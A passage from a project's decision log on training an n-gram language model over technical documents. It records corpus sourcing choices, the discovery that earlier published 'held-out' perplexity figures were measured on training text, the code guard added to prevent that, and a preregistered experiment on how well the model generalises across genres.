succeeds, the record looks plausible, and the model describes 250KB of the repository's own docs.
`train.yml` had never fired, so no model was built that way — timing rather than a safeguard, so the
fix ships with one. A step now fails the job when the fetched sources total under 10MB.

**A vocabulary ceiling that bound was invisible.** `Vocab.build` reported one `dropped_types` count
covering both types below `min_count` and types that met it and were cut because `max_size` filled
up. Only the first is a modelling decision; the second raises the OOV rate for a reason the rate
cannot show and makes perplexity incomparable. This mattered immediately: the run reached **205,907**
types against a default ceiling of **200,000**, so the default would have bound and the record would
not have said so. `vocab_truncated` is now in the record and the weekly job annotates it.

### What was not taken

Rust RFCs (MIT OR Apache-2.0) and Kubernetes KEPs (Apache-2.0) are better licensed than the largest
source in the corpus and are the same genre. Neither is numerically enumerable and `rust-lang/rfcs`
checks in no index — `SUMMARY.md` and `text/SUMMARY.md` are both 404 — so the only listing mechanism
is GitHub's tree API. That means allowing `api.github.com` in the prefix allowlist and accepting a
JSON response where the fetcher accepts `text/plain` and nothing else.

D10 banned network in a scheduled job because a job that can fetch is a job that can fetch weights,
and `text/plain` only is one of four things keeping the exception small. A JSON carve-out is a real
widening of that boundary rather than another row in a table, so it is backlog item 75 and the
owner's call.

Bitcoin BIPs were refused for a different reason and the difference is worth keeping separate:
`bitcoin/bips` has no repository licence file at all — `LICENSE`, `LICENSE.md` and `COPYING` are all
404 — and each BIP carries its own non-uniform `License:` header. The plumbing here would fetch them.
Doing so would mean reading a licence per document or asserting terms nobody read, and the second is
how a corpus acquires text nobody checked. `UNLICENSED_AT_SOURCE` records it. The XMPP XEPs were
dropped for a duller reason: the source form is XML, and a word-frequency model trained on it learns
tag names.


## D16. The held-out perplexity was not held out

**Found.** While running the order comparison at 68M tokens, from its OOV column.

**Resolved.** Two headline figures this repository published — 6.06 in D14 and 6.396 in D15 — were
computed on text the model trained on. The honest figure for the same corpus at order 4 is **26.29**.

### What happened

D13 states the rule and states it correctly:

> The vocabulary comes from the training half only. `SplitLibrary` yields one side, so `train()`
> never sees the other. Building it over everything hands the model every word it is about to be
> tested on, **and the OOV rate collapses for a reason unrelated to the model**.

`compare_orders` obeys that. The standalone evaluation did not. It trained on
`Library.load("corpora.yaml")` — the whole manifest, all 7,344 documents — and then scored
`SplitLibrary(..., every=20, side="heldout")`, which is 368 of those same 7,344. `train.yml` had the
identical shape: a full-manifest training step followed by a step scoring a stride of it.

The training record said so plainly the whole time. `documents: 7344`, and the source file counts sum
to 7,344.

### The measurement

One model, one corpus snapshot, two document sets of the same size. The model is the order-4 model
`compare_orders` built, which trained on the 6,976-document training half:

| set | documents | tokens | OOV | perplexity |
|---|---|---|---|---|
| never seen | 368 | 3,464,189 | **0.794%** | **26.29** |
| seen in training | 368 | 3,276,561 | **0.149%** | **6.51** |

**A factor of 4.04.** And the confirming detail: the published OOV rates were 0.15% (D14) and 0.13%
(D15). The in-sample rate measured here is 0.149%. Those figures were not near the honest number and
drifting; they were the in-sample number, exactly.

### What the collapse of a defence looks like

Worth writing down because the shape recurs. The rule was known, written in a decision record, and
enforced by a class built for it. What was missing is that nothing *refused*. `evaluate` accepted any
model and any library and returned a number, so the correct path and the incorrect path both produced
something that looked like held-out perplexity, and the incorrect one produced a prettier figure.

I then built `comparable_heldout` to explain the gap between 38.6 (a genuine held-out number from
`compare_orders`) and 17.4 (an in-sample one), and the explanation I recorded — a different, easier
test set, because the added sources are formulaic — was wrong. The function is right for other
reasons and stays. Its motivating story was a misdiagnosis of this bug.

### The fix is mechanical, because a stated rule is not one

- `train()` records `split` on the model's meta and on the training record: `{"every": N, "side":
  "train"}` for a split library, `None` for the whole manifest.
- `in_sample_refusal(model, held)` returns why a model must not be scored on some text. Four
  refusals: the model trained on everything; the model trained on this same side; the strides do not
  complement; or the model predates the field, which is refused rather than guessed at, because
  *absent* and *None* are different facts and treating them alike would silently accept exactly the
  models whose provenance is unknown.
- `evaluate()` raises on a refusal. `allow_in_sample=True` exists for deliberately measuring the gap
  — it is how the table above was produced — and reads as a deliberate act in a diff.
- `--held-out-every N` on the trainer, and `train.yml` passes 20. A boundary test asserts the trained
  stride and the scored stride match, so the two cannot drift apart again.
- **The shipped weekly model now trains on 95% of the corpus.** That is the price of the reported
  number meaning what it says. At 68M tokens the last 5% is worth much less than the honesty.

Both model files currently on disk predate the field, so both are refused. That is the conservative
answer and it is the right one.

### The order comparison, which is what found this

Same held-out text, same fingerprint `eb2fc01784de564a`, `comparable()` raises no refusal:

| order | n-grams | perplexity | OOV | peak RSS | seconds |
|---|---|---|---|---|---|
| 3 | 17.3M | 36.46 | 0.79% | 3.8GB | 321 |
| 4 | 40.8M | **26.29** | 0.79% | 10.7GB | 691 |

Order 4 buys **27.9%** for 2.37x the table. At 22.9M tokens (D13) the same step bought 16.4% for
2.2x.

**The higher order gets more valuable as the corpus grows, not less.** That is the opposite of the
intuition the question was asked to test — whether more text lets the cheaper order catch up — and
the reason is that a 4-gram table was data-starved at 22.9M tokens. So at a fixed memory ceiling,
spending it on order beats spending it on text, at least across this range.

Order 5 cannot be measured here. The 257MB-per-million-n-grams law puts an order-5 table at this
corpus around 17.5GB and the machine has 15GB. D13's order-5 figure stands at 22.9M tokens and does
not transfer.


## D17. E2: reading a genre is worth about 2.8x on that genre

**Asked.** Keep training the model until it can read by itself. Registered as E2 in
`docs/EXPERIMENTS.md` before either run, because the reachable half of that question is whether the
model has general competence on technical prose or has memorised one genre.

**Resolved.** It is much more an RFC model than a model of technical prose. Both preregistered
readings landed against the flattering interpretation, and the registration itself was
under-specified in one way that is worth recording.

### E2b, the well-powered half: 2.83x on identical text

A model trained with `pep` removed from the library entirely, against the shipped model which read
584 of the 615 PEPs, both scored on the **same 31 held-out PEPs**. Same fingerprint
`0ee3b7d301e67e59`, and `comparable_heldout` returns None.

| model | PEPs read | OOV | perplexity |
|---|---|---|---|
| shipped | 584 | 1.36% | **54.30** |
| `pep` never in the library | 0 | 2.96% | **153.53** |

**Ratio 2.83x.** The registered form of this comparison — 615 PEPs against the 31-document held-out
subset — gives 2.99x, and the tightened version above removes the set-size confound. Both are
reported; 2.83x on identical text is the one to quote.

Against the registered readings: a ratio near 1 would have said competence comes from technical
English generally, and above about 3 would have said most of it is the source being in the training
text. 2.83 is on that line and not under it. The threshold was written as "about 3" precisely so a
value like this could not be read as clearing it.

**Part of the gap is vocabulary, not modelling, and this run does not separate them.** OOV goes 1.36%
to 2.96%, so the never-seen model is also missing PEP-specific words. Splitting the two needs a
perplexity restricted to in-vocabulary tokens for both models — `genericity.py` already does exactly
that for surprisal, and `evaluate.py` does not. Backlog item 77.

### E2a, per genre, and where the registration fell short

The shipped model on the held-out side of the full split, narrowed to one source at a time:

| source | documents | tokens | OOV | perplexity |
|---|---|---|---|---|
| rfc | 316 | 3,275,441 | 0.74% | **24.78** |
| pep | 31 | 129,811 | 1.36% | 54.30 |
| eip | 16 | 35,869 | 2.23% | 103.70 |
| erc | 3 | 14,147 | 3.46% | 229.64 |
| repo-docs | 1 | 1,495 | 0.80% | 351.82 |

RFCs lowest, as registered — that was the sanity check on the split and it passed.

The registered bands were: within about 2x means general competence on the genre family, beyond about
5x means an RFC model that tolerates the others. The full spread is **9.3x**. But the rows are not
equally trustworthy and the ordering tracks document count as closely as it tracks genre: rfc against
pep is 2.19x on 316 and 31 documents, eip is 4.18x on 16, erc is 9.27x on 3.

**So the registration under-specified the design.** A stride of 20 over a corpus that is 95% RFCs
leaves 31 held-out PEPs and 16 held-out EIPs, which is too few to separate its own two readings. That
is a flaw in what was registered, not a reason to pick whichever band reads better. The row to trust
is `pep` at 2.19x, and E2b is the well-powered version of the same question at 615 documents.
`repo-docs` at one document is not evidence of anything and was registered as such.

### What this does and does not do to the genericity measure

The 35 scored artifacts are branch and critic prose. None of them is in the corpus, so every one is
maximally out of domain — which is the regime E2 says the model is weakest in. The absolute figures
around 9.6 bits are closer to *how unlike an RFC is this* than to *how predictable is this*. The
genericity report already said so in prose — "Name the corpus or do not quote the number" — and now
there is a number behind it.

What it does not do is undermine T1, and there is direct evidence rather than an argument. Re-running
the genericity analysis against the honest train-half model moves the T1 difference from +0.211 to
**+0.204** and the p-value from 0.1339 to 0.1449. The scale is corpus-specific; the difference between
two groups of equally out-of-domain artifacts barely moves. E2's registration predicted exactly this
and said it was not what E2 tested.

### The T1 difference across six corpora

| corpus | tokens | difference | p |
|---|---|---|---|
| 492 RFCs | 5.6M | +0.226 bits | 0.048 |
| 1,974 RFCs | 22.9M | +0.261 | 0.0455 |
| mixed, pruned | 40.0M | +0.224 | 0.0950 |
| mixed, unpruned | 55.4M | +0.243 | 0.0780 |
| mixed + ERC | 68.0M | +0.211 | 0.1339 |
| **train half, honest** | **64.5M** | **+0.204** | **0.1449** |

Fourteen times the corpus and the difference stays inside +0.20 to +0.26 bits. The p-value has drifted
up across the last four rows, which is either a small effect being estimated against a better model or
noise at n=7, and nothing here separates those. Pruned against kept remains null: −0.083 bits, p =
0.46, sign still changing between runs.

### The shipped model

Order 4 with `--held-out-every 20`: 64,549,478 tokens over the training half, 199,190-word vocabulary,
40,831,784 4-grams, `prunes: 0`, `vocab_truncated` zero, 10,703MB peak, 709 seconds, and
`split: {"every": 20, "side": "train"}` recorded so `evaluate` will accept it.

**Held-out perplexity 26.29** on 3,464,189 tokens at 0.79% OOV. The first figure this repository has
published under that name that is actually one.

Reproducibility note worth keeping: this run and the `compare_orders` order-4 run scored 26.289920 and
26.289909 on held-out sets whose fingerprints differ, because the repository's own documents are in
the corpus and were edited between the runs. Two ten-millionths of a difference from three tokens of
text — the fingerprint refused the comparison and the numbers agree anyway.
